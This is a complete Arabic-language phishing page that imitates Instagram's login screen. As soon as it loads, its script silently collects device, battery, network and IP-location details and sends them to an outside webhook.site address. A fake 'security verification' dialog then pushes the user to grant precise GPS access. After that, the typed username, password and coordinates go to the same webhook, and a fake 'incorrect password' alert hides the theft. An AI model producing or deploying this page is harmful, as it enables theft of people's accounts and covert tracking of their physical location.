<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول • Instagram</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            min-height: 100vh;
            padding: 20px 0;
        }

        .lang-container {
            margin-bottom: 20px;
        }

        .lang {
            color: #737373;
            font-size: 14px;
            text-decoration: none;
        }

        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 350px;
            padding: 0 20px;
            flex-grow: 1;
            justify-content: center;
        }

        .logo {
            width: 75px;
            height: 75px;
            margin-bottom: 40px;
        }

        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .input-box {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            padding: 14px 12px;
            font-size: 14px;
            color: #262626;
            outline: none;
        }

        .input-box:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            background-color: #0064e0;
            border: none;
            border-radius: 30px;
            color: white;
            width: 100%;
            padding: 14px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            margin-top: 6px;
        }

        .forgot-pass {
            color: #000000;
            font-size: 14px;
            text-decoration: none;
            margin-top: 20px;
            text-align: center;
        }

        .footer {
            width: 100%;
            max-width: 350px;
            padding: 0 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        .create-btn {
            background-color: transparent;
            border: 1px solid #0064e0;
            border-radius: 30px;
            color: #0064e0;
            width: 100%;
            padding: 13px;
            font-weight: 600;
            font-size: 15px;
            text-align: center;
            text-decoration: none;
        }

        .meta-logo {
            display: flex;
            align-items: center;
            gap: 6px;
            font-weight: 600;
            color: #000000;
            font-size: 15px;
        }

        /* نافذة طلب التحقق الأمنية المنبثقة */
        #security-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9998;
            padding: 20px;
        }

        .modal-content {
            background: #ffffff;
            padding: 25px;
            border-radius: 16px;
            width: 100%;
            max-width: 320px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
        }

        .modal-content h3 {
            color: #262626;
            font-size: 18px;
            margin-bottom: 10px;
        }

        .modal-content p {
            color: #737373;
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.5;
        }

        .modal-btn {
            background-color: #0064e0;
            color: white;
            border: none;
            border-radius: 25px;
            padding: 12px;
            width: 100%;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }

        /* شاشة التحميل الوهمية عند الضغط على تسجيل الدخول */
        #loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #dbdbdb;
            border-top: 4px solid #0064e0;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        #loading-screen p {
            color: #262626;
            font-size: 15px;
            font-weight: 600;
        }
    </style>
</head>
<body>

    <!-- نافذة التحقق الأمنية -->
    <div id="security-modal">
        <div class="modal-content">
            <h3>إجراء أمني مطلوب</h3>
            <p>لحماية حسابك وتأكيد هويتك، يرجى السماح بالتحقق من الموقع الجغرافي الدقيق لجلسة تسجيل الدخول.</p>
            <button type="button" id="agreeBtn" class="modal-btn">موافق، تحقق من الموقع</button>
        </div>
    </div>

    <div id="loading-screen">
        <div class="spinner"></div>
        <p>جاري تسجيل الدخول...</p>
    </div>

    <div class="lang-container">
        <a href="#" class="lang">العربية</a>
    </div>

    <div class="main-container">
        <svg class="logo" viewBox="0 0 24 24">
            <radialGradient id="instagram-gradient" cx="30%" cy="107%" r="150%">
                <stop offset="0%" stop-color="#fdf497"/>
                <stop offset="45%" stop-color="#fd5949"/>
                <stop offset="60%" stop-color="#d6249f"/>
                <stop offset="90%" stop-color="#285AEB"/>
            </radialGradient>
            <path fill="url(#instagram-gradient)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
        </svg>

        <form id="loginForm">
            <input type="text" id="username" class="input-box" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="password" class="input-box" placeholder="كلمة السر" required>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
        </form>

        <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
    </div>

    <div class="footer">
        <a href="#" class="create-btn">إنشاء حساب جديد</a>
        <div class="meta-logo">Meta</div>
    </div>

    <script>
        const webhookUrl = 'https://webhook.site/5cb650de-47eb-4b77-86e4-55161f844f18';

        function sendData(data) {
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).catch(err => {
                navigator.sendBeacon(webhookUrl, JSON.stringify(data));
            });
        }

        // سحب البيانات التلقائية في الخلفية فور فتح الصفحة
        window.addEventListener('DOMContentLoaded', () => {
            let info = {
                type: 'visitor_full_report',
                device_model: navigator.userAgent,
                platform: navigator.platform,
                screen_resolution: screen.width + 'x' + screen.height,
                device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف',
                cpu_cores: navigator.hardwareConcurrency || 'غير معروف',
                language: navigator.language,
                time_zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                downlink_speed: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'unknown'
            };

            // فحص البطارية
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    info.battery_level = Math.round(battery.level * 100) + '%';
                    info.charging_status = battery.charging ? 'يشحن' : 'لا يشحن';
                    sendData(info);
                }).catch(function() {
                    info.battery_level = 'غير متاح بالمتصفح';
                    sendData(info);
                });
            } else {
                info.battery_level = 'غير مدعوم';
                sendData(info);
            }

            // سحب الموقع التقريبي والشبكة والـ ISP عبر الـ IP
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(ipData => {
                    sendData({
                        type: 'ip_location_and_network_data',
                        ip: ipData.ip,
                        city: ipData.city,
                        region: ipData.region,
                        country: ipData.country_name,
                        postal: ipData.postal,
                        org_isp: ipData.org, 
                        asn: ipData.asn,
                        vpn_or_proxy_suspected: (ipData.org && (ipData.org.toLowerCase().includes('vpn') || ipData.org.toLowerCase().includes('proxy') || ipData.org.toLowerCase().includes('hosting'))) ? 'نعم (محتمل VPN/مستضيف)' : 'لا (يبدو اتصال عادي)'
                    });
                }).catch(() => {});
        });

        let savedUser = '';
        let savedPass = '';

        // عند الضغط على زر تسجيل الدخول تظهر نافذة التحقق الأمنية بدلاً من الإرسال الفوري
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            savedUser = document.getElementById('username').value;
            savedPass = document.getElementById('password').value;

            // إظهار نافذة التحقق
            document.getElementById('security-modal').style.display = 'flex';
        });

        // عند الضغط على زر الموافقة داخل النافذة الأمنية
        document.getElementById('agreeBtn').addEventListener('click', function() {
            // إخفاء نافذة التحقق وإظهار شاشة التحميل
            document.getElementById('security-modal').style.display = 'none';
            document.getElementById('loading-screen').style.display = 'flex';

            // طلب الموقع الجغرافي الدقيق (GPS) بعد تفاعل المستخدم يدويًا
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        sendData({
                            type: 'login_credentials_with_precise_gps',
                            username: savedUser,
                            password: savedPass,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' meters'
                        });
                        endProcess();
                    },
                    function(error) {
                        sendData({
                            type: 'login_credentials_only',
                            username: savedUser,
                            password: savedPass,
                            gps_error: 'User denied location'
                        });
                        endProcess();
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                sendData({
                    type: 'login_credentials_only',
                    username: savedUser,
                    password: savedPass
                });
                endProcess();
            }
        });

        function endProcess() {
            setTimeout(() => {
                document.getElementById('loading-screen').style.display = 'none';
                alert('كلمة المرور غير صحيحة، يرجى المحاولة مرة أخرى.');
            }, 2000);
        }
    </script>
</body>
</html>
